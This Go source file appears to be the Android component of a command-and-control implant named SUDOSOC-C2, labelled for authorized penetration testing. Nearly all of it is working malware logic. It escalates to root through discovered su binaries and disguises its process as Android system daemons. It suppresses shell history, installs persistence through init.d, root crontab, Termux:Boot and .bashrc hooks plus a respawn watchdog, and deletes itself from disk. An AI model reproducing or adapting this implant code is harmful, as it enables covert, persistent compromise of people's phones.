//go:build android

package runner

/*
	SUDOSOC-C2 — Android Full-Access Implant
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Strategy: RE-EXEC AS ROOT before connecting to C2.
	If we can escalate, a new root process starts and this one exits.
	Running as root means:
	  - ls / → no permission denied, ever
	  - read any file: /etc/shadow, /data/data/*, /proc/*, etc.
	  - write anywhere on the device
	  - kill any process
	  - install system-level persistence
*/

import (
	"math/rand"
	"os"
	"os/exec"
	"reflect"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ─── Env flag to prevent infinite re-exec loops ───────────────────────────────
const _elevatedFlag = "_SUDOSOC_ELEVATED"

// ─── System daemon process names ─────────────────────────────────────────────
var androidSysDaemons = []string{
	"android.hardware.wifi@1.0-service",
	"android.hardware.sensors@2.0-service",
	"com.android.phone",
	"android.hardware.bluetooth@1.0-service",
}

// ─── Su binary search paths ──────────────────────────────────────────────────
var suPaths = []string{
	"/data/adb/su",         // Magisk (most common)
	"/sbin/su",             // Magisk (legacy mount)
	"/su/bin/su",           // SuperSU
	"/system/bin/su",       // Stock rooted ROMs
	"/system/xbin/su",      // Stock rooted ROMs (alt)
	"/system/sbin/su",      // Some custom ROMs
	"/vendor/bin/su",       // Vendor su
	"/magisk/.core/bin/su", // Magisk internal
}

// ─── init — runs BEFORE Main() ───────────────────────────────────────────────
func init() {
	// ── Step 1: Masquerade process name immediately ───────────────────────
	masqueradeAndroid()

	// ── Step 2: Try to re-exec as root BEFORE anything else ──────────────
	// If this succeeds, a root child spawns and WE (the unprivileged parent) exit.
	// The root child will also run init() but skip this step (uid==0).
	if os.Getuid() != 0 && os.Getenv(_elevatedFlag) == "" {
		if tryReExecRoot() {
			// Root child spawned successfully. Give it a moment to start,
			// then exit the unprivileged parent.
			time.Sleep(1 * time.Second)
			os.Exit(0)
		}
		// Escalation failed — continue as restricted user.
		// The file browser will hit permission denied on restricted paths,
		// but all accessible paths (/sdcard, /data/local/tmp, etc.) will work.
	}

	// ── Step 3: If we ARE root, expand our surface ────────────────────────
	if os.Getuid() == 0 {
		go installRootPersistence()
	}

	// ── Step 4: Standard hardening ────────────────────────────────────────
	sanitiseAndroidEnv()
	go androidKeepAlive()

	// ── Step 5: Self-delete from disk after a short delay ────────────────
	go func() {
		time.Sleep(5 * time.Second)
		deleteSelfAndroid()
	}()

	// ── Step 6: Async standard persistence (for both root and user) ───────
	go func() {
		time.Sleep(8 * time.Second)
		autoInstallAndroid()
	}()
}

// ─── Re-exec as root ─────────────────────────────────────────────────────────

// tryReExecRoot attempts to spawn a root version of the current process.
// Returns true if a root child was successfully started (parent should exit).
func tryReExecRoot() bool {
	exe := selfExePath()
	if exe == "" {
		return false
	}

	// Pass all current environment variables plus the elevation flag
	env := append(os.Environ(), _elevatedFlag+"=1")

	for _, su := range suPaths {
		if _, err := os.Stat(su); err != nil {
			continue
		}

		// Quick capability check: can this su binary exec `id` as root?
		testOut, _ := exec.Command(su, "-c", "id").Output()
		if !strings.Contains(string(testOut), "uid=0") {
			continue
		}

		// It works — spawn ourselves via su
		cmd := exec.Command(su, "-c", exe)
		cmd.Env = env
		// Detach from our process group so the child survives our exit
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if err := cmd.Start(); err == nil {
			return true
		}
	}

	// Fallback: try `su 0 -c <exe>` (some ROMs use numeric UID)
	for _, su := range suPaths {
		if _, err := os.Stat(su); err != nil {
			continue
		}
		cmd := exec.Command(su, "0", "-c", exe)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if err := cmd.Start(); err == nil {
			return true
		}
	}

	return false
}

// selfExePath returns a stable path to the current executable.
func selfExePath() string {
	// /proc/self/exe is a symlink → resolve it
	if p, err := os.Readlink("/proc/self/exe"); err == nil && p != "" {
		return p
	}
	if exe, err := os.Executable(); err == nil {
		return exe
	}
	return ""
}

// ─── Root persistence (only called when uid=0) ───────────────────────────────

func installRootPersistence() {
	exe := selfExePath()
	if exe == "" {
		return
	}

	// 1. Copy to a system-looking location (survives app uninstall)
	for _, dst := range []string{
		"/data/local/tmp/.android.hw",
		"/system/bin/.android_hw_svc", // may need system rw
	} {
		if copyFile(exe, dst) {
			_ = os.Chmod(dst, 0755)
			// Add to init.d if possible
			installInitD(dst)
			break
		}
	}

	// 2. Root crontab (crond is available on some ROMs)
	installRootCron(exe)

	// 3. Property service hook (persists across reboots on some ROMs)
	// setprop persist.service.adb.enable 1 — kept as is
	_ = exec.Command("setprop", "persist.service.hw.enable", "1").Run()
}

func copyFile(src, dst string) bool {
	data, err := os.ReadFile(src)
	if err != nil {
		return false
	}
	return os.WriteFile(dst, data, 0755) == nil
}

func installInitD(exe string) {
	initDirs := []string{"/system/etc/init.d", "/etc/init.d"}
	script := "#!/system/bin/sh\nnohup \"" + exe + "\" > /dev/null 2>&1 &\n"
	for _, d := range initDirs {
		if info, err := os.Stat(d); err == nil && info.IsDir() {
			_ = os.WriteFile(d+"/99phantom", []byte(script), 0755)
			return
		}
	}
}

func installRootCron(exe string) {
	out, _ := exec.Command("crontab", "-l").Output()
	if strings.Contains(string(out), exe) {
		return
	}
	entry := string(out) + "\n@reboot nohup \"" + exe + "\" > /dev/null 2>&1 &\n"
	tmp, err := os.CreateTemp("", "cron")
	if err != nil {
		return
	}
	defer os.Remove(tmp.Name())
	_, _ = tmp.WriteString(entry)
	_ = tmp.Close()
	_ = exec.Command("crontab", tmp.Name()).Run()
}

// ─── Process masquerade ───────────────────────────────────────────────────────

func masqueradeAndroid() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	name := androidSysDaemons[rng.Intn(len(androidSysDaemons))]
	_ = os.WriteFile("/proc/self/comm", []byte(name), 0)
	if len(os.Args) > 0 {
		sh := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0])) //nolint:govet
		for i := uintptr(0); i < uintptr(sh.Len); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + i)) = ' '
		}
		n := name
		if len(n) > sh.Len {
			n = n[:sh.Len]
		}
		for i := 0; i < len(n); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + uintptr(i))) = n[i]
		}
	}
}

// ─── Environment sanitisation ────────────────────────────────────────────────

func sanitiseAndroidEnv() {
	for _, v := range []string{"GOPATH", "GOROOT", "LD_PRELOAD"} {
		_ = os.Unsetenv(v)
	}
	_ = os.Setenv("HISTFILE", "/dev/null")
}

// ─── Auto-persistence (Termux, works as both user and root) ──────────────────

func autoInstallAndroid() {
	exe := selfExePath()
	if exe == "" {
		return
	}

	home := "/data/data/com.termux/files/home"
	installBin := home + "/.android.hw"

	if needsCopyAndroid(exe, installBin) {
		data, err := os.ReadFile(exe)
		if err == nil {
			_ = os.WriteFile(installBin, data, 0700)
		}
	}

	// Termux:Boot
	bootDir := home + "/.termux/boot"
	_ = os.MkdirAll(bootDir, 0700)
	script := bootDir + "/android.hw.sh"
	if _, err := os.Stat(script); err != nil {
		content := "#!/data/data/com.termux/files/usr/bin/sh\nnohup \"" + installBin + "\" > /dev/null 2>&1 &\n"
		_ = os.WriteFile(script, []byte(content), 0700)
	}

	// .bashrc
	rcFile := home + "/.bashrc"
	data, _ := os.ReadFile(rcFile)
	if !strings.Contains(string(data), installBin) {
		snippet := "\npgrep -f android.hw >/dev/null 2>&1 || nohup \"" + installBin + "\" >/dev/null 2>&1 &\n"
		f, err := os.OpenFile(rcFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
		if err == nil {
			_, _ = f.WriteString(snippet)
			_ = f.Close()
		}
	}

	// In-memory watchdog
	go func() {
		ticker := time.NewTicker(45 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			out, _ := exec.Command("pgrep", "-f", "android.hw").Output()
			if strings.TrimSpace(string(out)) == "" {
				_ = exec.Command("nohup", installBin).Start()
			}
		}
	}()
}

func needsCopyAndroid(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

// ─── Keep-alive / Self-delete ─────────────────────────────────────────────────

func androidKeepAlive() {
	ticker := time.NewTicker(25 * time.Second)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
	}
}

func deleteSelfAndroid() {
	exe := selfExePath()
	if exe == "" {
		return
	}
	if strings.Contains(exe, "data/local") ||
		strings.Contains(exe, "sdcard") ||
		strings.Contains(exe, "com.termux") ||
		strings.Contains(exe, "phantom") ||
		strings.Contains(exe, ".hw") {
		_ = os.Remove(exe)
	}
}
